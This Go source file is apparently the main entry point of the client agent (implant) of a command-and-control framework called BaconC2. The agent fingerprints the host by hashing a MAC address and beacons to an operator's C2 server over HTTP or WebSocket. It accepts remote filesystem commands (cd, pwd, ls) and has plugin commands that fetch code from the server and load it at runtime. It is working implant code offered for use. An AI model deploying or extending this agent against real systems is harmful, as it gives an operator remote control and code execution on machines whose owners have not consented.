package main

import (
	"crypto/sha256"
	"encoding/hex"
	"flag"
	"fmt"
	"net"
	"os"
	"os/signal"
	"runtime"
	"syscall"
	"time"

	"github.com/RabbITCybErSeC/BaconC2/client/config"
	"github.com/RabbITCybErSeC/BaconC2/client/core/agent"
	"github.com/RabbITCybErSeC/BaconC2/client/core/executor"
	clientplugins "github.com/RabbITCybErSeC/BaconC2/client/core/plugins"
	"github.com/RabbITCybErSeC/BaconC2/client/core/state"
	"github.com/RabbITCybErSeC/BaconC2/client/core/transport"
	httptransport "github.com/RabbITCybErSeC/BaconC2/client/core/transport/http"
	wstransport "github.com/RabbITCybErSeC/BaconC2/client/core/transport/websocket"
	command_handler "github.com/RabbITCybErSeC/BaconC2/pkg/commands/handlers"
	"github.com/RabbITCybErSeC/BaconC2/pkg/commands/handlers/filesystem"
	"github.com/RabbITCybErSeC/BaconC2/pkg/logging"
	"github.com/RabbITCybErSeC/BaconC2/pkg/models"
	"github.com/RabbITCybErSeC/BaconC2/pkg/plugins"
	"github.com/RabbITCybErSeC/BaconC2/pkg/queue"
	"github.com/RabbITCybErSeC/BaconC2/pkg/utils/encoders"
	"github.com/google/uuid"
)

var (
	defaultServerURL      = "http://localhost:8081"
	defaultBeaconInterval = 10 * time.Second
	defaultProtocol       = "http"
	defaultUDPHost        = "127.0.0.1"
	defaultUDPPort        = 9000
)

func main() {
	logging.SetLevel(logging.LevelDebug)

	serverURL := flag.String("server", defaultServerURL, "C2 server URL (e.g. http://127.0.0.1:8081)")
	beaconInt := flag.Int("interval", int(defaultBeaconInterval.Seconds()), "Beacon interval in seconds")
	protocol := flag.String("protocol", defaultProtocol, "Communication protocol (http/ws)")
	udpHost := flag.String("udphost", defaultUDPHost, "UDP server host")
	udpPort := flag.Int("udpport", defaultUDPPort, "UDP server port")
	flag.Parse()

	cfg := &config.AgentConfig{
		AgentID:        generateAgentID(),
		ServerURL:      *serverURL,
		BeaconInterval: time.Duration(*beaconInt) * time.Second,
		Protocol:       *protocol,
		UDPServerHost:  *udpHost,
		UDPServerPort:  *udpPort,
	}

	cmdQueue := queue.NewMemoryQueue[models.Command]()
	resultQueue := queue.NewMemoryQueue[models.CommandResult]()

	encoderChain := encoders.NewChainEncoder([]encoders.Encoder{encoders.DummyEncoder{}})

	httpTransport := httptransport.NewHTTPClientTransport(cfg.ServerURL, cfg.AgentID, cmdQueue, resultQueue, encoderChain)
	wsTransport := wstransport.NewWebSocketTransport(cfg.ServerURL, cfg.AgentID)

	agentState := state.NewAgentState()

	commandRegistry := command_handler.GetGlobalCommandRegistry()
	commandRegistry.RegisterHandler(command_handler.CommandHandler{
		Name:    "return_results",
		Handler: httpTransport.SendResults,
	})

	commandRegistry.RegisterStatefulHandler(filesystem.NewCdHandler())
	commandRegistry.RegisterStatefulHandler(filesystem.NewPwdHandler())
	commandRegistry.RegisterStatefulHandler(filesystem.NewLsHandler())

	pluginService := plugins.NewDynamicPluginService(commandRegistry, agentState)

	// Plugin fetching is only available if the transport implements IPluginFetcher
	// For now: Not all transports can support this (e.g., UDP, DNS, ICMP)
	var pluginCommands *clientplugins.ClientPluginCommands

	if fetcher, ok := httpTransport.(transport.IPluginFetcher); ok {
		pluginCommands = clientplugins.NewPluginCommands(pluginService, fetcher)
		commandRegistry.RegisterHandler(command_handler.CommandHandler{
			Name:    "plugin_install",
			Handler: pluginCommands.HandlePluginInstall,
		})
		commandRegistry.RegisterHandler(command_handler.CommandHandler{
			Name:    "plugin_unload",
			Handler: pluginCommands.HandlePluginUnload,
		})
		commandRegistry.RegisterHandler(command_handler.CommandHandler{
			Name:    "plugin_list",
			Handler: pluginCommands.HandlePluginList,
		})
		commandRegistry.RegisterHandler(command_handler.CommandHandler{
			Name:    "plugin_status",
			Handler: pluginCommands.HandlePluginStatus,
		})
		commandRegistry.RegisterHandler(command_handler.CommandHandler{
			Name:    "plugin_info",
			Handler: pluginCommands.HandlePluginInfo,
		})
		logging.Info("Plugin system initialized with remote fetching support (%d plugins loaded)", pluginService.GetStore().Count())
	} else {
		logging.Warn("Transport does not support plugin fetching - plugin_install command unavailable")
		logging.Info("Plugin system initialized in local-only mode (%d plugins loaded)", pluginService.GetStore().Count())
	}

	commandExecutor := executor.NewDefaultCommandExecutor(cmdQueue, resultQueue, httpTransport, wsTransport, cfg, commandRegistry, agentState)
	client := agent.NewAgentClient(cfg, httpTransport, commandExecutor, cmdQueue, resultQueue)

	if err := client.Initialize(); err != nil {
		logging.Error("Failed to initialize agent: %v", err)
		os.Exit(1)
	}

	go commandExecutor.ProcessCommandQueue()

	if err := client.Start(); err != nil {
		logging.Error("Failed to start agent: %v", err)
		os.Exit(1)
	}

	logging.Info("Agent client started successfully")

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	<-sigChan

	logging.Info("Shutting down agent...")

	// Shutdown plugin system
	if err := pluginService.Shutdown(); err != nil {
		logging.Error("Error during plugin shutdown: %v", err)
	}

	client.Stop()
	logging.Info("Agent client stopped")
}

func generateAgentID() string {
	platform := runtime.GOOS

	ifaces, err := net.Interfaces()
	if err == nil {
		for _, iface := range ifaces {
			mac := iface.HardwareAddr
			if len(mac) == 0 {
				continue
			}
			sum := sha256.Sum256(mac)
			hashedMAC := hex.EncodeToString(sum[:8])
			return fmt.Sprintf("%s-%s", platform, hashedMAC)
		}
	}

	return fmt.Sprintf("%s-%s", platform, uuid.New().String())
}
